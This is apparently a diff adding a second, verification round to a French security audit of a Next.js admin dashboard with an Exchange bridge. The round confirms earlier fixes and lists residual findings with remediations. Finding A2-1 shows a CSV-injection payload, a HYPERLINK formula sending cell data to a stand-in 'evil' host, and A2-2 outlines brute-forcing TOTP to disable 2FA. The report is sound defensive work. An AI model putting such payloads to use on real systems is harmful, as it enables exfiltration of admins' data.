@@ -3,6 +3,8 @@
 > **Date** : 2026-07-02 · **Version auditée** : 1.22.1 · **Type** : audit de code en lecture seule (aucune modification)
 > **Méthode** : 4 revues parallèles indépendantes — (1) authentification & autorisation, (2) injections & pont Exchange, (3) secrets & cryptographie, (4) sécurité web & infrastructure.
 > **Statut** : document d'information / suivi. Les corrections ne sont **pas** appliquées dans ce rapport.
+>
+> **Suivi (mis à jour le 2026-07-02)** : les findings de cet audit #1 ont été remédiés en v1.22.4→v1.22.7 (E1/E2/M1→M9/B1→B9). Un **audit #2 de vérification** a été mené — voir la section [Audit #2](#audit-2--vérification-des-correctifs-2026-07-02) en fin de document (correctifs confirmés + nouveaux findings résiduels).
 
 ## Résumé exécutif
 
@@ -160,3 +162,63 @@ Le corps d'erreur Graph (peut contenir UPN/PII selon l'endpoint) et le claim `sc
 5. **Échappement/validation OData** (M3) + `encodeURIComponent` (B4).
 6. **Durcissement** : retrait de « Directory Readers » (M2), chiffrement `totpSecret` (M7), `GET local-admin` restreint (B2), bcrypt factice anti-timing (B3), `exo-bridge` non-root (M5).
 7. Cosmétique/défense en profondeur : contrôle de rôle serveur (B1), SameSite explicite (B5), audit non falsifiable (B6), bridge constant-time (B7), politique MDP admin local (B8), filtrage logs PII (B9).
+
+---
+
+## Audit #2 — vérification des correctifs (2026-07-02)
+
+> **Version auditée** : 1.22.7 · **Type** : audit de code en lecture seule · **Méthode** : 4 revues parallèles indépendantes (auth/crypto/middleware, injections/bridge, secrets/config, web/infra) chargées de (A) vérifier les correctifs v1.22.4→v1.22.7 et (B) chercher de nouveaux problèmes/régressions.
+
+## (A) Correctifs de l'audit #1 — vérifiés OK
+
+Confirmés indépendamment dans le code réel : en-têtes de sécurité (E2), crypto AES-256-GCM avec IV unique + tag vérifié (M7), chiffrement TOTP branché sur tous les chemins (setup/enable/disable + `authorize`), durcissement 2FA `setup`/`disable` non contournable par simple session volée (M1), anti-timing bcrypt coût 12 (B3), retrait de « Directory Readers » (M2), `escapeODataString` sur tous les `$filter` à variable (M3), `encodeURIComponent` sur les segments de path Graph (B4), schémas Zod complets sur les 4 routes (M4), bridge comparaison constant-time SHA-256+XOR et `/health` sans tenant (B7), `exo-bridge` non-root (M5), `GET local-admin` restreint au compte courant (B2), cookies SameSite/HttpOnly/Secure (B5), confinement serveur via middleware (B1), retrait du fallback `changeme` Postgres (M8), logs `graphFetch` sans corps d'erreur (B9). **Aucun Critique/Élevé.**
+
+## (B) Nouveaux findings résiduels
+
+### 🟠 A2-1 — Moyenne — Correctif CSV (M6) incomplet : 2 exports du tableau de bord non protégés
+`src/app/dashboard/page.tsx` — `exportAnomaliesCSV` (~l.443-461) et `exportStatsCSV` (~l.96-124) utilisent un échappement local qui double les guillemets mais **ne neutralise pas** `= + - @` (tab/CR). Ils exportent des champs contrôlables par un attaquant (`displayName`, `userPrincipalName`, `appName`…). Le helper `csvCell` (`src/lib/csv.ts`) existe mais n'a été branché que sur 2 exports (Historique, Connexions) sur 4.
+**Scénario** : un `displayName` valant `=HYPERLINK("http://evil/"&A1)` s'exécute à l'ouverture de l'export dans Excel côté admin.
+**Correctif** : remplacer les `esc` locaux par `csvCell`.
+
+### 🟠 A2-2 — Moyenne — Pas de rate-limit sur la vérification TOTP (endpoints authentifiés)
+`src/app/api/admin/local-admin/totp/route.ts` (`enable`/`disable`/`setup`) — `verifyTotp()` est appelé sans compteur d'échecs ni délai (le verrouillage n'existe qu'au login dans `authorize`).
+**Scénario** : une session locale volée sans le facteur TOTP peut marteler `POST {"action":"disable","code":...}` pour brute-forcer les 6 chiffres et désactiver la 2FA.
+**Correctif** : réutiliser `failedAttempts`/`lockedUntil` de `LocalAdmin` (ou rate-limit par session/IP) sur ces endpoints.
+
+### 🟠 A2-3 — Moyenne — Rotation de `NEXTAUTH_SECRET` casse la 2FA + `decryptSecret` non défensif
+`src/lib/crypto.ts` + `docs/Rotation-secrets.md`. La clé de chiffrement TOTP dérive de `NEXTAUTH_SECRET` quand `TOTP_ENCRYPTION_KEY` n'est pas défini (cas par défaut). Faire tourner `NEXTAUTH_SECRET` (recommandé par le runbook) rend les `totpSecret` indéchiffrables ; `decryptSecret` lève alors une exception **non catchée** dans `authorize()` → échec de connexion de l'admin local avec 2FA (lockout du compte de secours).
+**Correctif** : rendre `decryptSecret` défensif (try/catch → échec propre), documenter le couplage dans le runbook, recommander une `TOTP_ENCRYPTION_KEY` dédiée.
+
+### 🟠 A2-4 — Moyenne — `getToken` (middleware) : nom de cookie déduit d'une autre source que `auth.ts`
+`src/middleware.ts` vs `src/lib/auth.ts`. Le nom du cookie de session est choisi sur `NODE_ENV` dans `auth.ts`, mais `getToken()` le déduit de `NEXTAUTH_URL`. Si ces sources divergent (TLS terminé en amont, `NEXTAUTH_URL` en `http://` alors que `NODE_ENV=production`), `getToken` renvoie `null` → le middleware ne confine plus l'admin local (**fail-open**). Atténué par les gardes `accessToken` des routes API (pas de fuite de données Graph), mais la défense en profondeur tombe.
+**Correctif** : passer explicitement `cookieName`/`secureCookie` à `getToken`, dérivés de la même logique que `authOptions.cookies`.
+
+### 🟡 A2-5 — Faible — `startsWith("/dashboard/admin")` : correspondance par préfixe
+`src/middleware.ts` + `src/components/layout/dashboard-shell.tsx`. Non exploitable aujourd'hui, mais une future route `/dashboard/administrators` matcherait le préfixe et ne serait pas confinée pour l'admin local. **Correctif** : match exact (`=== "/dashboard/admin" || startsWith("/dashboard/admin/")`).
+
+### 🟡 A2-6 — Faible — `@odata.id` dans les bodies non encodés
+`src/services/graph/groups.ts` (ajout membre/owner) et `src/services/graph/roles.ts` (assignRole) interpolent `userId` brut dans `.../directoryObjects/${userId}` (le path est encodé en B4, mais pas cette URL de body). `id`/`userId` de route ne sont pas non plus validés en UUID (seuls `roleId`/`skuId` le sont). Impact borné par le scope du jeton. **Correctif** : encoder, ou valider `id` en `.uuid()`.
+
+### 🟡 A2-7 — Faible — Fuite d'information dans les erreurs 500 / logs de route
+Plusieurs routes renvoient `{ error: error.message }` en 500 et font `console.error("[/api/...]", error)`. Le message Graph (propagé par `graph.ts`) peut contenir des UPN/PII, ce qui réintroduit partiellement dans les logs ce que B9 a retiré, et expose des détails internes à l'admin authentifié. **Correctif** : message générique côté client + log d'un identifiant/erreur filtrée.
+
+### 🟡 A2-8 — Faible (opérationnel) — `.pfx` non lisible par l'uid non-root du bridge
+Conséquence de M5 : le `.pfx` monté `:ro` conserve l'uid/mode de l'hôte. S'il est en mode 600 pour un uid ≠ 10001, l'utilisateur `bridge` ne peut plus le lire → `Connect-ExchangeOnline` échoue alors qu'en root cela passait. **Correctif** : documenter que `onering-exo.pfx` doit être lisible par l'uid 10001 (chown/mode), ou aligner l'uid.
+
+### ℹ️ A2-9 — Info
+- **CSP minimale** (`next.config.ts`) : seulement `frame-ancestors 'none'` ; une CSP `script-src 'self'` ajouterait un filet anti-XSS (attention aux styles inline Next/Tailwind et `img-src data:`).
+- **`@auth/prisma-adapter`** : dépendance morte (mode JWT pur) + modèles `Account`/`Session`/`VerificationToken` vestiges dans `schema.prisma`.
+- **Anti-rejeu TOTP** : `window:1` accepte plusieurs codes et aucun suivi du dernier code utilisé (faiblesse TOTP standard).
+- **`GET /api/audit`** : lisible par l'admin local (compte de secours) — surface de lecture large mais acceptée par conception.
+- **Vars docker-compose sans garde `:?`** : `NEXTAUTH_SECRET`/`EXO_BRIDGE_SECRET` deviennent silencieusement vides si absents (contrairement à `POSTGRES_PASSWORD`).
+
+## Plan de remédiation audit #2 (par priorité)
+
+1. **A2-1** brancher `csvCell` sur les 2 exports du dashboard (*vraie faille CSV résiduelle*).
+2. **A2-3** `decryptSecret` défensif + doc couplage `NEXTAUTH_SECRET`/TOTP + reco clé dédiée.
+3. **A2-2** rate-limit sur la vérification TOTP.
+4. **A2-4** `getToken` avec `cookieName`/`secureCookie` explicites.
+5. **A2-5** match exact du préfixe admin + **A2-6** encodage `@odata.id`.
+6. Durcissement/doc : A2-7 (erreurs génériques), A2-8 (doc `.pfx`/uid), A2-9 (CSP, dépendance morte, gardes docker-compose).
+
+**Manuel / non traité** : M9 (passphrase `.pfx`, cf. [Rotation-secrets.md](Rotation-secrets.md)).
